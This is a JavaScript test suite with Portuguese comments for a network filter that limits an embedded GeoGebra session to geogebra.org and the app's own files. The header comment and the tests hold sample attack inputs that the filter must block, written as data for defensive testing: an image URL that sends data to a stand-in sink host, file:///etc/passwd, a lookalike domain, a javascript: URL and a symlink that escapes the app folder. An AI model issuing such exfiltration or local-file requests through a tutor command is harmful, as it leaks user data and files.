/* Filtro de rede do GeoGebra online: sem o pacote offline, a sessão da view
   deixa passar só o `geogebra.org` (o applet da web) e os arquivos do próprio
   app. Um `evalCommand` do tutor como `Image("https://sink.exemplo/p.png?d=DADOS")`
   ou `Image("file:///...")` nem sai da sessão: sem o filtro, o pedido vazava
   dados ou lia arquivo local pelo screenshot. */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {createRequire} from 'node:module';

const require = createRequire(import.meta.url);
const {ggbOnlineAllowed, installOnlineSession} = require('../ggb-pack-protocol.cjs');

function withAppDir(fn) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mesa-ggb-online-'));
  fs.writeFileSync(path.join(dir, 'ggb.html'), '<html></html>');
  return Promise.resolve(fn(dir)).finally(() => fs.rmSync(dir, {recursive: true, force: true}));
}

test('só geogebra.org, o app, data: e blob: passam', () => withAppDir((appDir) => {
  assert.equal(ggbOnlineAllowed('https://www.geogebra.org/apps/deployggb.js', appDir), true);
  assert.equal(ggbOnlineAllowed('https://cdn.geogebra.org/x.js', appDir), true);
  assert.equal(ggbOnlineAllowed('https://geogebra.org/x', appDir), true);
  assert.equal(ggbOnlineAllowed('wss://www.geogebra.org/socket', appDir), true);
  assert.equal(ggbOnlineAllowed('https://geogebra.org.evil.example/x', appDir), false, 'sufixo parecido não é o domínio');
  assert.equal(ggbOnlineAllowed('https://evil.example/p.png?d=DADOS', appDir), false);
  assert.equal(ggbOnlineAllowed('http://127.0.0.1:9/p.png', appDir), false, 'nem o sink local do teste');
  assert.equal(ggbOnlineAllowed('ftp://evil.example/x', appDir), false);
  assert.equal(ggbOnlineAllowed('file:///etc/passwd', appDir), false, 'file: fora do app não sai');
  assert.equal(ggbOnlineAllowed(`file://${path.join(appDir, 'ggb.html')}`, appDir), true, 'o ggb.html do app carrega');
  assert.equal(ggbOnlineAllowed('data:image/png;base64,iVBORw0=', appDir), true);
  assert.equal(ggbOnlineAllowed('blob:https://www.geogebra.org/x', appDir), true);
  assert.equal(ggbOnlineAllowed('javascript:alert(1)', appDir), false);
  assert.equal(ggbOnlineAllowed('nem-url', appDir), false);
}));

test('symlink dentro do app apontando para fora continua bloqueado', () => withAppDir((appDir) => {
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'mesa-ggb-out-'));
  try {
    const secret = path.join(outside, 'segredo.png');
    fs.writeFileSync(secret, 'png');
    const link = path.join(appDir, 'atalho.png');
    fs.symlinkSync(secret, link);
    assert.equal(ggbOnlineAllowed(`file://${link}`, appDir), false);
  } finally {
    fs.rmSync(outside, {recursive: true, force: true});
  }
}));

test('sem webRequest na sessão, não instala nada e devolve false', () => {
  assert.equal(installOnlineSession({}, {}), false);
  assert.equal(installOnlineSession({webRequest: {}}, {}), false);
});

test('installOnlineSession cancela o resto e avisa o onBlocked', () => withAppDir((appDir) => {
  let filter = null;
  const blocked = [];
  installOnlineSession({webRequest: {onBeforeRequest: (fn) => { filter = fn; }}}, {appDir, onBlocked: (url) => blocked.push(url)});
  assert.equal(typeof filter, 'function');
  const decide = (url) => new Promise((resolve) => filter({url}, resolve));
  return (async () => {
    assert.deepEqual(await decide('https://www.geogebra.org/apps/deployggb.js'), {cancel: false});
    assert.deepEqual(await decide('https://sink.exemplo/p.png?d=DADOS'), {cancel: true});
    assert.deepEqual(await decide('file:///etc/passwd'), {cancel: true});
    assert.deepEqual(blocked, ['https://sink.exemplo/p.png?d=DADOS', 'file:///etc/passwd'], 'só o bloqueado é avisado');
  })();
}));
